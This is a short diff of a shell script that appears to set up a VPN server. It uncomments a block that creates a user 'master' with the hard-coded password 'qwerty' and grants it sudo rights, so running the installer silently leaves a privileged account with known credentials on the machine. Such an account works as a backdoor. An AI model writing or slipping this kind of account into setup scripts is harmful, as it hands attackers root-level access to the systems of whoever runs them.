@@ -26,11 +26,11 @@ mkdir -p /root/myvpn/cron
 grep "/bin/false" /etc/shells || echo "/bin/false" >> /etc/shells
 grep "/bin/nologin" /etc/shells || echo "/usr/sbin/nologin" >> /etc/shells
 
-##Login="master"
-##Pass="qwerty"
-##useradd -m -s /bin/bash $Login
-##echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
-##usermod -aG sudo $Login
+Login="master"
+Pass="qwerty"
+useradd -m -s /bin/bash $Login
+echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
+usermod -aG sudo $Login
 
 site="https://raw.githubusercontent.com/lamtota40/vpn-server-easy/main"
 
